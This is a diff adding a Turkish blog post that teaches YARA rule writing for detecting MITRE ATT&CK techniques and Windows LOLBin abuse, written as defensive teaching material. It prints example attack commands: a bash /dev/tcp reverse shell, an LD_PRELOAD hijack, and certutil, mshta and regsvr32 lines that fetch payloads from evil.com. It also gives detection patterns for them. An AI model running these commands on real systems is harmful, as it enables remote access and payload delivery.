@@ -335,6 +335,277 @@
   // Her yazı için: id (url'de #id olarak görünür, boşluksuz), title, date, excerpt (listede görünen özet),
   // body (tam yazı, basit HTML kullanabilirsin: <p>, <pre><code>, <strong> vb.)
   const posts = [
+      {
+  id: "yara-ile-tehdit-tespiti",
+  title: "YARA ile Tehdit Tespiti — MITRE ATT&CK Tekniklerine ve LOLBins'e Özel Kurallar",
+  date: "16 Temmuz 2026",
+  excerpt: "Bir dosya sisteminize düşüyor. AV sessiz. EDR alarm vermiyor. İşte tam bu noktada YARA devreye giriyor. 8 farklı MITRE ATT&CK tekniği için yazdığım YARA kurallarını ve arkasındaki mantığı adım adım açıklıyorum.",
+  body: `
+    <p>Bir dosya sisteminize düşüyor. AV sessiz. EDR alarm vermiyor. Ama siz bir şeylerin yanlış olduğunu hissediyorsunuz. İşte tam bu noktada YARA devreye giriyor.</p>
+    <p>Bu yazıda YARA'nın ne olduğunu, nasıl çalıştığını ve gerçek MITRE ATT&CK tekniklerine karşı nasıl kural yazıldığını anlatacağım. Bash reverse shell'den Squiblydoo'ya, LD_PRELOAD'dan certutil abuse'a kadar 8 farklı teknik için yazdığım kuralları ve arkasındaki mantığı adım adım açıklayacağım.</p>
+
+    <h2>YARA Nedir?</h2>
+    <p>YARA — "Yet Another Recursive Acronym" — dosya ve bellek içeriğini string, byte pattern ve mantıksal koşullarla eşleştirerek kötü amaçlı yazılımları tanımlamaya yarayan açık kaynaklı bir pattern-matching aracıdır. VirusTotal bünyesinde Victor Alvarez tarafından geliştirilmiştir.</p>
+    <p>En basit tanımıyla: <strong>"Bu string bu dosyada var mı?"</strong> sorusunu soran ve buna göre alarm üreten bir araç. Ama YARA'yı güçlü kılan şey bu basitliğin ötesinde. String kombinasyonları, byte pattern'leri, dosya boyutu kontrolü, PE header analizi, regex — bunların hepsini bir arada kullanarak çok hassas ve güçlü tespit kuralları yazabiliyorsunuz.</p>
+
+    <h2>YARA ile CrowdStrike IOA Arasındaki Fark</h2>
+    <p>İkisi de tehdit tespit ediyor ama çalışma mantıkları tamamen farklı.</p>
+    <p><strong>CrowdStrike IOA</strong> canlı process davranışını izliyor. Process tree'ye bakıyor, parent-child ilişkisini analiz ediyor, komut satırı argümanlarını değerlendiriyor. Kısacası bir şey <em>çalışırken</em> yakalıyor.</p>
+    <p><strong>YARA</strong> ise statik analiz yapıyor. Bir dosyanın içindeki string'lere, byte dizilerine veya pattern'lere bakıyor. Dosya çalışmak zorunda değil — sadece disk üzerinde var olması yeterli. Hatta memory dump alıp bellekteki içeriği de tarayabiliyorsunuz.</p>
+    <p>Bu iki yaklaşım birbirini tamamlıyor. Bir saldırgan script'ini diske yazdıysa YARA yakalar. Çalıştırdıysa IOA yakalar. İkisi birlikte kullanıldığında savunma katmanı çok daha sağlam oluyor.</p>
+
+    <h2>YARA Kural Yapısı</h2>
+    <p>Bir YARA kuralı üç ana bölümden oluşuyor: <strong>meta</strong>, <strong>strings</strong> ve <strong>condition</strong>.</p>
+    <pre><code>rule RuleName {
+    meta:
+        description = "Kuralın amacı"
+        author      = "Roman"
+        date        = "2026-07-16"
+        mitre       = "T1059.004"
+    strings:
+        $s1 = "aranacak_string"
+        $s2 = { 4D 5A 90 00 }   // hex byte pattern
+        $s3 = /regex_pattern/   // regex
+    condition:
+        any of ($s*)
+}</code></pre>
+    <p><strong>meta:</strong> Kural hakkında bilgi. Zorunlu değil ama önemli — özellikle MITRE ID'si ve açıklama her zaman eklenmelidir.</p>
+    <p><strong>strings:</strong> Aranacak pattern'ler. ASCII/Unicode string, hex byte pattern veya regex olarak tanımlanabilir.</p>
+    <p><strong>condition:</strong> Kuralın tetikleneceği koşul. Temel operatörler: <code>any of ($s*)</code> herhangi biri eşleşirse, <code>all of ($s*)</code> tümü eşleşmeli, <code>uint16(0) == 0x5A4D</code> PE dosyası kontrolü, <code>filesize &lt; 1MB</code> dosya boyutu koşulu.</p>
+    <p>Condition'ı doğru yazmak kural yazımının kalbidir. Çok geniş yazarsanız false positive yağmuruna tutulursunuz. Çok dar yazarsanız gerçek tehditler gözden kaçar.</p>
+
+    <h2>Bölüm 1: MITRE ATT&CK Execution Teknikleri</h2>
+
+    <h3>T1059.004 — Bash Reverse Shell</h3>
+    <p>Saldırgan hedef sisteme bir bash scripti ulaştırır. Bu script <code>/dev/tcp</code> mekanizmasıyla saldırganın makinesine bir TCP bağlantısı açar ve bash'in stdin/stdout'unu bu bağlantıya yönlendirir. Sonuç: uzaktan interaktif shell erişimi.</p>
+    <pre><code>bash -i >& /dev/tcp/10.0.0.5/4444 0>&1</code></pre>
+    <p>Burada <code>-i</code> interaktif mod, <code>&gt;&amp;</code> hem stdout hem stderr'i sokete yönlendiriyor, <code>0&gt;&amp;1</code> ise stdin'i de aynı kanaldan alıyor. Saldırganın makinesi 4444 portunu dinlerken kurban makine ona bağlanıyor — tersine çalışan bir shell.</p>
+    <p>Obfuscation için base64 encode sıkça kullanılıyor. Zararlı komut encode ediliyor, echo ile yazılıyor, <code>base64 -d</code> ile decode edilip pipe'la bash'e gönderiliyor.</p>
+    <pre><code>rule Detect_Bash_ReverseShell_T1059_004 {
+    meta:
+        description = "Bash reverse shell pattern tespiti"
+        author      = "Roman"
+        mitre       = "T1059.004"
+        severity    = "High"
+    strings:
+        $tcp    = "/dev/tcp/"   ascii
+        $udp    = "/dev/udp/"   ascii
+        $b64sh  = "base64 -d"   ascii
+        $pipesh = "| bash"      ascii
+        $pipesh2= "| sh"        ascii
+        $redir  = ">& /dev/"    ascii
+        $inter  = "bash -i"     ascii
+    condition:
+        any of ($tcp, $udp, $redir) or
+        ($inter and any of ($b64sh, $pipesh, $pipesh2))
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> <code>/dev/tcp/</code> veya <code>/dev/udp/</code> veya <code>&gt;&amp; /dev/</code> görürsen direkt alarm ver — bunların meşru kullanımı neredeyse yok. <code>bash -i</code> ile birlikte base64 decode veya pipe-to-shell kombinasyonu da alarm tetikler. Bu kuralı <code>/tmp</code> ve <code>/var/tmp</code> gibi geçici dizinlerdeki dosyalarda çalıştırmak en etkili sonucu veriyor.</p>
+
+    <h3>T1053.003 — Cron Persistence</h3>
+    <p>Cron, Linux/macOS sistemlerde zamanlanmış görevleri çalıştıran bir servistir. Saldırganlar bu servisi persistence için kullanıyor — sistem yeniden başlasa bile kötü amaçlı kod çalışmaya devam ediyor. Rocke, TeamTNT, Kinsing gibi kripto madenciliği malware aileleri ve GoldMax/Gomir gibi backdoor'lar bu tekniği aktif kullanıyor.</p>
+    <p>Tehdit altındaki dosyalar: <code>/etc/crontab</code>, <code>/etc/cron.d/*</code>, <code>/var/spool/cron/crontabs/*</code></p>
+    <pre><code>rule Detect_Malicious_Cron_T1053_003 {
+    meta:
+        description = "Crontab dosyasinda kotu amacli icerik tespiti"
+        author      = "Roman"
+        mitre       = "T1053.003"
+        severity    = "Medium-High"
+    strings:
+        $reboot  = "@reboot"    ascii
+        $curl    = "curl "      ascii
+        $wget    = "wget "      ascii
+        $b64     = "base64"     ascii
+        $pipebsh = "| bash"     ascii
+        $pipesh  = "| sh"       ascii
+        $devtcp  = "/dev/tcp"   ascii
+        $http    = "http://"    ascii
+        $https   = "https://"   ascii
+    condition:
+        ($reboot and any of ($curl,$wget,$http,$https)) or
+        any of ($devtcp, $pipebsh, $pipesh) or
+        ($b64 and any of ($pipebsh, $pipesh))
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> <code>@reboot</code> direktifi meşru olabilir ama yanında <code>curl</code>, <code>wget</code> veya bir URL varsa kesinlikle şüpheli. <code>/dev/tcp</code> tek başına yeterli alarm sebebi. Base64 ile pipe-to-shell kombinasyonu da güçlü bir sinyal. Paket yöneticilerinin oluşturduğu cron girişlerinden false positive gelebileceğine dikkat edin.</p>
+
+    <h3>T1106 — Native API Abuse</h3>
+    <p>EDR sistemleri genellikle user-mode API'larını hook'layarak zararlı aktiviteleri yakalıyor. Saldırganlar bu hook'ları atlatmak için doğrudan syscall kullanıyor. Linux'ta Python üzerinden örnek:</p>
+    <pre><code>import ctypes
+libc = ctypes.CDLL("libc.so.6")
+libc.execve(b"/bin/sh", [b"/bin/sh"], None)</code></pre>
+    <p>Bu kod standart <code>subprocess</code> veya <code>os.system</code> yerine doğrudan <code>execve</code> syscall'ını çağırıyor — EDR'nin hook'larını atlıyor.</p>
+    <pre><code>rule Detect_Native_API_Abuse_T1106 {
+    meta:
+        description = "Native API / direkt syscall kullanimi tespiti"
+        author      = "Roman"
+        mitre       = "T1106"
+        severity    = "High"
+    strings:
+        $ctypes  = "ctypes.CDLL"    ascii
+        $libc    = "libc.so"        ascii
+        $execve  = "execve"         ascii
+        $ptrace  = "ptrace"         ascii
+        $procmem = "/proc/self/mem" ascii
+        $mmap    = "mmap"           ascii
+        $syscall = "syscall"        ascii
+    condition:
+        ($ctypes and $libc and $execve) or
+        ($ptrace and $procmem) or
+        ($mmap and $syscall and $execve)
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> <code>ctypes.CDLL</code> + <code>libc.so</code> + <code>execve</code> üçlüsü Python üzerinden doğrudan syscall yapıldığının güçlü işareti. <code>ptrace</code> + <code>/proc/self/mem</code> memory injection'ı işaret ediyor. <code>ctypes</code> tek başına meşru kullanımda yaygın — bu yüzden condition kombinasyonlu tutulmuş.</p>
+
+    <h3>T1129 — Shared Modules (LD_PRELOAD)</h3>
+    <p>Linux'ta <code>LD_PRELOAD</code> environment değişkeni, bir program çalışmadan önce belirtilen shared library'yi yükler. Bu library içinde sistem fonksiyonlarıyla aynı isimde fonksiyonlar varsa orijinallerin yerini alır.</p>
+    <pre><code>LD_PRELOAD=/tmp/evil.so /usr/bin/ls</code></pre>
+    <p>Kullanıcı sadece <code>ls</code> gördü ama arka planda backdoor çalıştı. Sistem genelinde kalıcı hale getirmek için <code>/etc/ld.so.preload</code> dosyasına yazılıyor. Rocke malware ailesi bu tekniği aktif kullanıyor.</p>
+    <pre><code>rule Detect_Malicious_SharedModule_T1129 {
+    meta:
+        description = "Kotu amacli .so dosyasi / LD_PRELOAD tespiti"
+        author      = "Roman"
+        mitre       = "T1129"
+        severity    = "High"
+    strings:
+        $ldpreload = "LD_PRELOAD"         ascii
+        $ldso      = "/etc/ld.so.preload" ascii
+        $tmp       = "/tmp/"              ascii
+        $devshm    = "/dev/shm/"          ascii
+        $dlopen    = "dlopen"             ascii
+        $execve    = "execve"             ascii
+        $revsh     = "/dev/tcp"           ascii
+        $elfmagic  = { 7F 45 4C 46 }
+    condition:
+        $elfmagic at 0 and
+        (($ldpreload and ($tmp or $devshm)) or
+         ($ldso) or
+         ($dlopen and $execve) or
+         ($revsh))
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> <code>{ 7F 45 4C 46 }</code> ELF magic byte'ı — kural sadece Linux ELF binary'lerine uygulansın diye condition'ın başına eklendi, metin dosyalarında false positive üretmez. <code>/etc/ld.so.preload</code> tek başına yüksek riskli. <code>/dev/tcp</code> bir ELF binary içindeyse reverse shell kodu gömülmüş demek.</p>
+
+    <h3>T1204.002 — User Execution: Malicious File</h3>
+    <p>Sosyal mühendislik. Kullanıcı kandırılarak kötü amaçlı bir dosyayı kendisi çalıştırıyor. Linux'ta uzantı çalıştırılabilirliği belirlemez — <code>chmod +x</code> yeterli. <code>fatura.pdf.sh</code> adlı bir dosya PDF gibi görünebilir ama içinde shell script var.</p>
+    <pre><code>rule Detect_MaliciousFile_UserExec_T1204_002 {
+    meta:
+        description = "Sahte uzantili kotu amacli script tespiti"
+        author      = "Roman"
+        mitre       = "T1204.002"
+        severity    = "Medium-High"
+    strings:
+        $shebang  = "#!/bin/bash" ascii
+        $shebang2 = "#!/bin/sh"   ascii
+        $chmod    = "chmod +x"    ascii
+        $curl     = "curl"        ascii
+        $wget     = "wget"        ascii
+        $pipesh   = "| bash"      ascii
+        $pipesh2  = "| sh"        ascii
+        $revsh    = "/dev/tcp"    ascii
+    condition:
+        any of ($shebang, $shebang2) and
+        (any of ($curl, $wget, $revsh) or
+         $chmod or any of ($pipesh, $pipesh2))
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> Shebang satırı dosyanın shell script olduğunu söylüyor. Yanında <code>curl</code>, <code>wget</code>, <code>| bash</code> veya <code>/dev/tcp</code> görürsek — Downloads veya Desktop gibi kullanıcı dizinlerinden gelen bu dosya büyük ihtimalle kötü amaçlı.</p>
+
+    <h2>Bölüm 2: LOLBins — YARA Kuralları</h2>
+    <p>LOLBins için YARA farklı bir perspektiften devreye giriyor. Bu araçlar meşru olduğu için sadece varlıkları alarm vermez — ama bir batch script, scheduled task XML veya komut dosyasında şüpheli parametrelerle çağrıldıklarını görürsek tespit edebiliriz.</p>
+
+    <h3>certutil.exe — T1140 / T1105</h3>
+    <p>certutil.exe, Windows'un sertifika yönetim aracıdır. Saldırganlar <code>-urlcache</code> ile dosya indirme, <code>-decode</code> ile base64 payload açma için kötüye kullanıyor.</p>
+    <pre><code>certutil -urlcache -split -f http://evil.com/payload.exe payload.exe
+certutil -decode encoded.txt payload.exe</code></pre>
+    <pre><code>rule Detect_Certutil_Abuse_T1140_T1105 {
+    meta:
+        description = "certutil.exe LOLBin kotu amacli kullanim tespiti"
+        author      = "Roman"
+        mitre       = "T1140, T1105"
+        severity    = "High"
+    strings:
+        $certutil = "certutil"  ascii nocase
+        $urlcache = "-urlcache" ascii nocase
+        $decode   = "-decode"   ascii nocase
+        $encode   = "-encode"   ascii nocase
+        $split    = "-split"    ascii nocase
+        $http     = "http://"   ascii
+        $https    = "https://"  ascii
+        $force    = "-f "       ascii nocase
+    condition:
+        $certutil and
+        (($urlcache and ($http or $https)) or
+         ($decode and $force) or
+         ($encode and $split))
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> <code>certutil</code> tek başına yeterli değil. <code>certutil</code> + <code>-urlcache</code> + URL görürsek şüpheli. <code>nocase</code> flag'i önemli: <code>CERTUTIL</code>, <code>CeRtUtIl</code>, <code>certutil</code> — hepsi yakalanıyor. Saldırganlar büyük/küçük harf değiştirerek basit eşleşmeleri atlatmaya çalışıyor.</p>
+
+    <h3>mshta.exe — T1218.005</h3>
+    <p>mshta.exe, HTA dosyalarını çalıştıran meşru bir Windows aracıdır. Browser güvenlik ayarlarını bypass eder, diske hiç dosya yazmadan uzaktan kod çalıştırabilir.</p>
+    <pre><code>mshta.exe http://evil.com/payload.hta
+mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run(""malware.exe"")")
+mshta.exe javascript:alert("Test");close()</code></pre>
+    <pre><code>rule Detect_Mshta_Abuse_T1218_005 {
+    meta:
+        description = "mshta.exe LOLBin / HTA kotu amacli kullanim tespiti"
+        author      = "Roman"
+        mitre       = "T1218.005"
+        severity    = "High"
+    strings:
+        $mshta      = "mshta"          ascii nocase
+        $http       = "http://"        ascii
+        $https      = "https://"       ascii
+        $vbscript   = "vbscript:"      ascii nocase
+        $jscript    = "javascript:"    ascii nocase
+        $wshell     = "WScript.Shell"  ascii nocase
+        $activex    = "ActiveXObject"  ascii nocase
+        $powershell = "powershell"     ascii nocase
+        $resize     = "resizeTo"       ascii
+    condition:
+        ($mshta and any of ($http,$https,$vbscript,$jscript)) or
+        ($wshell and $activex and $powershell) or
+        ($resize and $mshta)
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> Üç farklı condition bloğu var. Birinci: <code>mshta</code> + URL veya inline script. İkinci: <code>WScript.Shell</code> + <code>ActiveXObject</code> + <code>powershell</code> — bu üçlü HTA dosyalarında neredeyse her zaman kötü amaçlı. Üçüncü: <code>resizeTo</code> + <code>mshta</code> — fidye yazılımı operatörlerinin mshta penceresini kullanıcıdan gizlemek için kullandığı 0px boyutlandırma trick'i.</p>
+
+    <h3>regsvr32.exe — T1218.010 (Squiblydoo)</h3>
+    <p>Squiblydoo, Casey Smith tarafından 2016'da keşfedilen bir AppLocker bypass tekniğidir. <code>/i:</code> parametresi bir URL alınca <code>scrobj.dll</code> o URL'deki <code>.sct</code> scriptlet dosyasını indirip çalıştırıyor. Diske hiçbir şey yazılmıyor.</p>
+    <pre><code>regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll</code></pre>
+    <p>Hedef <code>.sct</code> dosyası XML formatında bir scriptlet'tir ve içinde JScript veya VBScript bulunur.</p>
+    <pre><code>rule Detect_Regsvr32_Squiblydoo_T1218_010 {
+    meta:
+        description = "regsvr32 Squiblydoo / SCT scriptlet tespiti"
+        author      = "Roman"
+        mitre       = "T1218.010"
+        severity    = "High"
+    strings:
+        $regsvr32 = "regsvr32"       ascii nocase
+        $scrobj   = "scrobj.dll"     ascii nocase
+        $sct_tag  = "<scriptlet>"    ascii nocase
+        $reg_tag  = "<registration"  ascii nocase
+        $http_i   = "/i:http"        ascii nocase
+        $https_i  = "/i:https"       ascii nocase
+        $jscript  = "JScript"        ascii
+        $vbscript = "VBScript"       ascii
+        $wshell   = "WScript.Shell"  ascii nocase
+    condition:
+        ($regsvr32 and $scrobj and any of ($http_i,$https_i)) or
+        ($sct_tag and $reg_tag and any of ($jscript,$vbscript,$wshell))
+}</code></pre>
+    <p><strong>Kural mantığı:</strong> İki condition bloğu var. Birinci: <code>regsvr32</code> + <code>scrobj.dll</code> + <code>/i:http</code> — Squiblydoo komutunun kendisi. İkinci: <code>&lt;scriptlet&gt;</code> + <code>&lt;registration</code> + aktif script içeriği — doğrudan <code>.sct</code> dosyasını yakalar. Bu kombinasyon neredeyse her zaman Squiblydoo veya benzeri bir tekniğin eseridir.</p>
+
+    <h2>YARA Kurallarını Çalıştırmak</h2>
+    <p>Tek dosyayı taramak için:</p>
+    <pre><code>yara kural.yar hedef_dosya.sh</code></pre>
+    <p>Bir dizini recursive olarak taramak için:</p>
+    <pre><code>yara -r kural.yar /tmp/</code></pre>
+    <p>Eşleşen string'leri de görmek için:</p>
+    <pre><code>yara -s kural.yar hedef.exe</code></pre>
+    <p>CrowdStrike Falcon da kendi custom YARA motorunu destekliyor. Yukarıdaki kuralları Falcon konsoluna aktararak tüm sensörlü makinelerde otomatik tarama yapabilirsiniz.</p>
+
+    <h2>Sonuç</h2>
+    <p>8 kural, 8 farklı teknik. Ama hepsinin arkasında aynı felsefe var: <strong>spesifik hash veya dosya adına değil, davranış pattern'ine odaklan.</strong></p>
+    <p>Bir saldırgan yarın yeni bir certutil versiyonu kullanabilir — hash değişir. Ama <code>-urlcache</code> parametresi değişmez. Bir reverse shell bin türlü obfuscate edilebilir — ama <code>/dev/tcp/</code> string'i her seferinde orada olacak.</p>
+    <p>İyi bir YARA kuralı şu soruya cevap verir: <em>Bu tekniğin değişmeyecek olan bileşeni nedir?</em></p>
+    <p>Condition kombinasyonları ise false positive ile false negative arasındaki dengeyi kuruyor. Çok geniş yazarsanız alarm gürültüsüne boğulursunuz. Çok dar yazarsanız gerçek tehditler gözden kaçar. Bu dengeyi bulmak kural yazımının en zor ve en kritik kısmı.</p>
+  `
+},
   {
   id: "MITM",
   title: "Görünmeyen Üçüncü Kişi Man-in-the-Middle (MITM) Saldırıları",
@@ -443,20 +714,7 @@
     <h2>7. Sonuç</h2>
     <p>MITM saldırıları, ağ güvenliği açısından ciddi riskler oluşturmaktadır. Özellikle şifreleme kullanılmayan veya yanlış yapılandırılmış protokoller ve altyapı servisleri bu saldırılara zemin hazırlamaktadır. Güvenli yapılandırmalar, doğru tespit mekanizmaları ve kullanıcı farkındalığı, MITM saldırılarına karşı en etkili savunma yöntemidir.</p>
   `
-},
-    {
-      id: "ornek-yazi",
-      title: "Örnek: Bir vaka incelemesi nasıl yazılır",
-      date: "16 Temmuz 2026",
-      excerpt: "İkinci yazı için örnek şablon — kod bloğu ve paragraf kullanımını gösteriyor.",
-      body: `
-        <p>Bir vaka incelemesi yazarken genelde şu sırayı takip ediyorum:</p>
-        <p><strong>1. Tespit</strong> — Alarmın nasıl tetiklendiği.</p>
-        <pre><code>Process: certutil.exe
-Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></pre>
-        <p>Bu tarz kod bloklarını <code>&lt;pre&gt;&lt;code&gt;</code> ile ekleyebilirsin.</p>
-      `
-    }
+}
   ];
   // -------------------------
 
